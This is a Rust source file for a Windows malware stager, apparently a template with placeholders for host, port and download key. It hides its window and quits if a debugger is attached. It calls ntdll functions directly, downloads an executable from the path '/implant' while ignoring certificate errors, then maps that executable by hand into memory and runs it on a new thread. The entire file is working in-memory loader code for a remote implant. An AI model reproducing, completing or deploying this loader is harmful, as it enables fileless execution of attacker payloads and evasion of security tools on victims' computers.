#![windows_subsystem = "windows"]

use std::ffi::c_void;
use std::ptr::{null, null_mut};

type HANDLE = *mut c_void;
type PVOID = *mut c_void;
type HMODULE = *mut c_void;
type HINTERNET = *mut c_void;
type NTSTATUS = i32;
type DWORD = u32;
type WORD = u16;
type ULONG = u32;
type USHORT = u16;
type BOOL = i32;

const MEM_COMMIT: DWORD = 0x1000;
const MEM_RESERVE: DWORD = 0x2000;
const PAGE_READWRITE: DWORD = 0x04;
const PAGE_READONLY: DWORD = 0x02;
const PAGE_EXECUTE_READ: DWORD = 0x20;
const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
const THREAD_ALL_ACCESS: DWORD = 0x1FFFFF;

const IMAGE_DOS_SIGNATURE: WORD = 0x5A4D;
const IMAGE_NT_SIGNATURE: DWORD = 0x00004550;
const IMAGE_ORDINAL_FLAG64: u64 = 0x8000000000000000;
const IMAGE_REL_BASED_DIR64: WORD = 10;
const IMAGE_REL_BASED_HIGHLOW: WORD = 3;
const IMAGE_SCN_MEM_EXECUTE: DWORD = 0x20000000;
const IMAGE_SCN_MEM_WRITE: DWORD = 0x80000000;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;

const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: DWORD = 0;
const WINHTTP_FLAG_SECURE: DWORD = 0x00800000;
const WINHTTP_OPTION_SECURITY_FLAGS: DWORD = 31;
const SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS: DWORD = 0x00003300;
const WINHTTP_ADDREQ_FLAG_ADD: DWORD = 0x20000000;

const HOST: &[u16] = &HOST_PLACEHOLDER;
const PORT: USHORT = PORT_PLACEHOLDER;
const USE_TLS: bool = USE_TLS_PLACEHOLDER;
const DOWNLOAD_KEY: &str = "DOWNLOAD_KEY_PLACEHOLDER";

#[repr(C)]
struct ImageDosHeader {
    e_magic: WORD,
    e_cblp: WORD,
    e_cp: WORD,
    e_crlc: WORD,
    e_cparhdr: WORD,
    e_minalloc: WORD,
    e_maxalloc: WORD,
    e_ss: WORD,
    e_sp: WORD,
    e_csum: WORD,
    e_ip: WORD,
    e_cs: WORD,
    e_lfarlc: WORD,
    e_ovno: WORD,
    e_res: [WORD; 4],
    e_oemid: WORD,
    e_oeminfo: WORD,
    e_res2: [WORD; 10],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageFileHeader {
    machine: WORD,
    number_of_sections: WORD,
    time_date_stamp: DWORD,
    pointer_to_symbol_table: DWORD,
    number_of_symbols: DWORD,
    size_of_optional_header: WORD,
    characteristics: WORD,
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: DWORD,
    size: DWORD,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: WORD,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: DWORD,
    size_of_initialized_data: DWORD,
    size_of_uninitialized_data: DWORD,
    address_of_entry_point: DWORD,
    base_of_code: DWORD,
    image_base: u64,
    section_alignment: DWORD,
    file_alignment: DWORD,
    major_os_version: WORD,
    minor_os_version: WORD,
    major_image_version: WORD,
    minor_image_version: WORD,
    major_subsystem_version: WORD,
    minor_subsystem_version: WORD,
    win32_version_value: DWORD,
    size_of_image: DWORD,
    size_of_headers: DWORD,
    checksum: DWORD,
    subsystem: WORD,
    dll_characteristics: WORD,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: DWORD,
    number_of_rva_and_sizes: DWORD,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature: DWORD,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: DWORD,
    virtual_address: DWORD,
    size_of_raw_data: DWORD,
    pointer_to_raw_data: DWORD,
    pointer_to_relocations: DWORD,
    pointer_to_linenumbers: DWORD,
    number_of_relocations: WORD,
    number_of_linenumbers: WORD,
    characteristics: DWORD,
}

#[repr(C)]
struct ImageBaseRelocation {
    virtual_address: DWORD,
    size_of_block: DWORD,
}

#[repr(C)]
struct ImageImportDescriptor {
    original_first_thunk: DWORD,
    time_date_stamp: DWORD,
    forwarder_chain: DWORD,
    name: DWORD,
    first_thunk: DWORD,
}

#[repr(C)]
struct ImageImportByName {
    hint: WORD,
    name: [u8; 1],
}

type NtAllocateVirtualMemoryFn =
    unsafe extern "system" fn(HANDLE, *mut PVOID, usize, *mut usize, ULONG, ULONG) -> NTSTATUS;

type NtProtectVirtualMemoryFn =
    unsafe extern "system" fn(HANDLE, *mut PVOID, *mut usize, ULONG, *mut ULONG) -> NTSTATUS;

type NtCreateThreadExFn = unsafe extern "system" fn(
    *mut HANDLE,
    DWORD,
    PVOID,
    HANDLE,
    PVOID,
    PVOID,
    ULONG,
    usize,
    usize,
    usize,
    PVOID,
) -> NTSTATUS;

type NtWaitForSingleObjectFn = unsafe extern "system" fn(HANDLE, BOOL, *const i64) -> NTSTATUS;

#[link(name = "kernel32")]
extern "system" {
    fn GetModuleHandleA(name: *const u8) -> HMODULE;
    fn GetProcAddress(module: HMODULE, name: *const u8) -> PVOID;
    fn LoadLibraryA(name: *const u8) -> HMODULE;
}

#[link(name = "winhttp")]
extern "system" {
    fn WinHttpOpen(
        agent: *const u16,
        access_type: DWORD,
        proxy: *const u16,
        bypass: *const u16,
        flags: DWORD,
    ) -> HINTERNET;
    fn WinHttpConnect(
        session: HINTERNET,
        server: *const u16,
        port: USHORT,
        reserved: DWORD,
    ) -> HINTERNET;
    fn WinHttpOpenRequest(
        connect: HINTERNET,
        verb: *const u16,
        object: *const u16,
        version: *const u16,
        referrer: *const u16,
        accept: *const *const u16,
        flags: DWORD,
    ) -> HINTERNET;
    fn WinHttpSendRequest(
        request: HINTERNET,
        headers: *const u16,
        headers_len: DWORD,
        optional: PVOID,
        optional_len: DWORD,
        total_len: DWORD,
        context: usize,
    ) -> BOOL;
    fn WinHttpReceiveResponse(request: HINTERNET, reserved: PVOID) -> BOOL;
    fn WinHttpReadData(request: HINTERNET, buffer: PVOID, to_read: DWORD, read: *mut DWORD)
        -> BOOL;
    fn WinHttpCloseHandle(internet: HINTERNET) -> BOOL;
    fn WinHttpSetOption(
        hInternet: HINTERNET,
        dwOption: DWORD,
        lpBuffer: PVOID,
        dwBufferLength: DWORD,
    ) -> BOOL;
    fn WinHttpAddRequestHeaders(
        hRequest: HINTERNET,
        lpszHeaders: *const u16,
        dwHeadersLength: DWORD,
        dwModifiers: DWORD,
    ) -> BOOL;
}

static mut FN_NT_ALLOCATE: Option<NtAllocateVirtualMemoryFn> = None;
static mut FN_NT_PROTECT: Option<NtProtectVirtualMemoryFn> = None;
static mut FN_NT_CREATE_THREAD: Option<NtCreateThreadExFn> = None;
static mut FN_NT_WAIT: Option<NtWaitForSingleObjectFn> = None;

#[inline]
fn nt_success(status: NTSTATUS) -> bool {
    status >= 0
}

unsafe fn resolve_funcs() -> bool {
    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
    if ntdll.is_null() {
        return false;
    }

    let alloc = GetProcAddress(ntdll, b"NtAllocateVirtualMemory\0".as_ptr());
    let protect = GetProcAddress(ntdll, b"NtProtectVirtualMemory\0".as_ptr());
    let create = GetProcAddress(ntdll, b"NtCreateThreadEx\0".as_ptr());
    let wait = GetProcAddress(ntdll, b"NtWaitForSingleObject\0".as_ptr());

    if alloc.is_null() || protect.is_null() || create.is_null() || wait.is_null() {
        return false;
    }

    FN_NT_ALLOCATE = Some(std::mem::transmute(alloc));
    FN_NT_PROTECT = Some(std::mem::transmute(protect));
    FN_NT_CREATE_THREAD = Some(std::mem::transmute(create));
    FN_NT_WAIT = Some(std::mem::transmute(wait));

    true
}

unsafe fn download(host: *const u16, port: USHORT, path: *const u16) -> (*mut u8, DWORD) {
    let session = WinHttpOpen(null(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, null(), null(), 0);
    if session.is_null() {
        return (null_mut(), 0);
    }

    let connect = WinHttpConnect(session, host, port, 0);
    if connect.is_null() {
        WinHttpCloseHandle(session);
        return (null_mut(), 0);
    }

    let verb: [u16; 4] = [b'G' as u16, b'E' as u16, b'T' as u16, 0];

    // Set WINHTTP_FLAG_SECURE if TLS is enabled
    let flags: DWORD = if USE_TLS { WINHTTP_FLAG_SECURE } else { 0 };

    let request = WinHttpOpenRequest(connect, verb.as_ptr(), path, null(), null(), null(), flags);
    if request.is_null() {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return (null_mut(), 0);
    }

    // If TLS enabled, ignore certificate validation errors for self-signed certs
    if USE_TLS {
        let mut sec_flags: DWORD = SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS;
        WinHttpSetOption(
            request,
            WINHTTP_OPTION_SECURITY_FLAGS,
            &mut sec_flags as *mut _ as PVOID,
            4,
        );
    }

    let header_str = format!("X-Download-Key: {}\r\n\0", DOWNLOAD_KEY);
    let header_wide: Vec<u16> = header_str.encode_utf16().collect();
    if WinHttpAddRequestHeaders(
        request,
        header_wide.as_ptr(),
        (-1i32) as DWORD,
        WINHTTP_ADDREQ_FLAG_ADD,
    ) == 0
    {
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return (null_mut(), 0);
    }

    if WinHttpSendRequest(request, null(), 0, null_mut(), 0, 0, 0) == 0 {
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return (null_mut(), 0);
    }

    if WinHttpReceiveResponse(request, null_mut()) == 0 {
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return (null_mut(), 0);
    }

    let mut cap: usize = 0x100000;
    let mut base: PVOID = null_mut();

    if !nt_success((FN_NT_ALLOCATE.unwrap())(
        -1isize as HANDLE,
        &mut base,
        0,
        &mut cap,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )) {
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return (null_mut(), 0);
    }

    let buf = base as *mut u8;
    let mut total: DWORD = 0;

    loop {
        let mut bytes_read: DWORD = 0;
        if WinHttpReadData(
            request,
            buf.add(total as usize) as PVOID,
            (cap as DWORD) - total,
            &mut bytes_read,
        ) == 0
        {
            break;
        }
        if bytes_read == 0 {
            break;
        }
        total += bytes_read;

        if total >= (cap as DWORD) - 0x10000 {
            let mut new_size: usize = cap * 2;
            let mut new_buf: PVOID = null_mut();
            if !nt_success((FN_NT_ALLOCATE.unwrap())(
                -1isize as HANDLE,
                &mut new_buf,
                0,
                &mut new_size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )) {
                WinHttpCloseHandle(request);
                WinHttpCloseHandle(connect);
                WinHttpCloseHandle(session);
                return (null_mut(), 0);
            }
            std::ptr::copy_nonoverlapping(buf, new_buf as *mut u8, total as usize);
            cap = new_size;
        }
    }

    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);

    if total == 0 {
        return (null_mut(), 0);
    }

    (buf, total)
}

unsafe fn map_pe(raw: *mut u8, _raw_size: DWORD) -> PVOID {
    let dos = raw as *const ImageDosHeader;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return null_mut();
    }

    let nt = raw.add((*dos).e_lfanew as usize) as *const ImageNtHeaders64;
    if (*nt).signature != IMAGE_NT_SIGNATURE {
        return null_mut();
    }

    let mut image_size: usize = (*nt).optional_header.size_of_image as usize;
    let mut base: PVOID = null_mut();

    if !nt_success((FN_NT_ALLOCATE.unwrap())(
        -1isize as HANDLE,
        &mut base,
        0,
        &mut image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )) {
        return null_mut();
    }

    let mapped = base as *mut u8;

    std::ptr::copy_nonoverlapping(raw, mapped, (*nt).optional_header.size_of_headers as usize);

    let sec_base =
        (nt as *const u8).add(std::mem::size_of::<ImageNtHeaders64>()) as *const ImageSectionHeader;
    let num_sections = (*nt).file_header.number_of_sections as usize;

    for i in 0..num_sections {
        let sec = sec_base.add(i);
        if (*sec).size_of_raw_data > 0 {
            std::ptr::copy_nonoverlapping(
                raw.add((*sec).pointer_to_raw_data as usize),
                mapped.add((*sec).virtual_address as usize),
                (*sec).size_of_raw_data as usize,
            );
        }
    }

    let delta = (mapped as i64) - ((*nt).optional_header.image_base as i64);
    if delta != 0 && (*nt).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].size > 0
    {
        let mut reloc = mapped.add(
            (*nt).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC].virtual_address
                as usize,
        ) as *mut ImageBaseRelocation;
        while (*reloc).virtual_address != 0 {
            let count =
                ((*reloc).size_of_block as usize - std::mem::size_of::<ImageBaseRelocation>()) / 2;
            let entries =
                (reloc as *const u8).add(std::mem::size_of::<ImageBaseRelocation>()) as *const WORD;
            for j in 0..count {
                let entry = *entries.add(j);
                let rel_type = entry >> 12;
                let offset = (entry & 0xFFF) as DWORD;
                if rel_type == IMAGE_REL_BASED_DIR64 {
                    let patch =
                        mapped.add(((*reloc).virtual_address + offset) as usize) as *mut u64;
                    *patch = ((*patch as i64) + delta) as u64;
                } else if rel_type == IMAGE_REL_BASED_HIGHLOW {
                    let patch =
                        mapped.add(((*reloc).virtual_address + offset) as usize) as *mut u32;
                    *patch = ((*patch as i64) + delta) as u32;
                }
            }
            reloc = (reloc as *const u8).add((*reloc).size_of_block as usize)
                as *mut ImageBaseRelocation;
        }
    }

    if (*nt).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].size > 0 {
        let mut imp = mapped.add(
            (*nt).optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].virtual_address
                as usize,
        ) as *mut ImageImportDescriptor;
        while (*imp).name != 0 {
            let mod_name = mapped.add((*imp).name as usize);
            let module = LoadLibraryA(mod_name);
            if !module.is_null() {
                let mut thunk = mapped.add((*imp).first_thunk as usize) as *mut u64;
                let mut orig_thunk = if (*imp).original_first_thunk != 0 {
                    mapped.add((*imp).original_first_thunk as usize) as *mut u64
                } else {
                    thunk
                };
                while *orig_thunk != 0 {
                    if (*orig_thunk & IMAGE_ORDINAL_FLAG64) != 0 {
                        *thunk = GetProcAddress(module, (*orig_thunk & 0xFFFF) as *const u8) as u64;
                    } else {
                        let name = mapped.add(*orig_thunk as usize) as *const ImageImportByName;
                        *thunk = GetProcAddress(module, (*name).name.as_ptr()) as u64;
                    }
                    thunk = thunk.add(1);
                    orig_thunk = orig_thunk.add(1);
                }
            }
            imp = imp.add(1);
        }
    }

    for i in 0..num_sections {
        let sec = sec_base.add(i);
        let chr = (*sec).characteristics;
        let prot = if (chr & IMAGE_SCN_MEM_EXECUTE) != 0 {
            if (chr & IMAGE_SCN_MEM_WRITE) != 0 {
                PAGE_EXECUTE_READWRITE
            } else {
                PAGE_EXECUTE_READ
            }
        } else if (chr & IMAGE_SCN_MEM_WRITE) != 0 {
            PAGE_READWRITE
        } else {
            PAGE_READONLY
        };

        let mut sec_addr: PVOID = mapped.add((*sec).virtual_address as usize) as PVOID;
        let mut sec_size: usize = if (*sec).virtual_size == 0 {
            (*sec).size_of_raw_data as usize
        } else {
            (*sec).virtual_size as usize
        };
        let mut old_prot: ULONG = 0;
        (FN_NT_PROTECT.unwrap())(
            -1isize as HANDLE,
            &mut sec_addr,
            &mut sec_size,
            prot,
            &mut old_prot,
        );
    }

    mapped.add((*nt).optional_header.address_of_entry_point as usize) as PVOID
}

#[link(name = "kernel32")]
extern "system" {
    fn IsDebuggerPresent() -> BOOL;
}

fn main() {
    unsafe {
        if IsDebuggerPresent() != 0 {
            return;
        }

        if !resolve_funcs() {
            return;
        }

        let path: [u16; 9] = [
            b'/' as u16,
            b'i' as u16,
            b'm' as u16,
            b'p' as u16,
            b'l' as u16,
            b'a' as u16,
            b'n' as u16,
            b't' as u16,
            0,
        ];

        let (buf, size) = download(HOST.as_ptr(), PORT, path.as_ptr());
        if buf.is_null() || size < 0x100 {
            return;
        }

        let entry = map_pe(buf, size);
        if entry.is_null() {
            return;
        }

        let mut thread: HANDLE = null_mut();
        if !nt_success((FN_NT_CREATE_THREAD.unwrap())(
            &mut thread,
            THREAD_ALL_ACCESS,
            null_mut(),
            -1isize as HANDLE,
            entry,
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut(),
        )) {
            return;
        }

        (FN_NT_WAIT.unwrap())(thread, 0, null());
    }
}
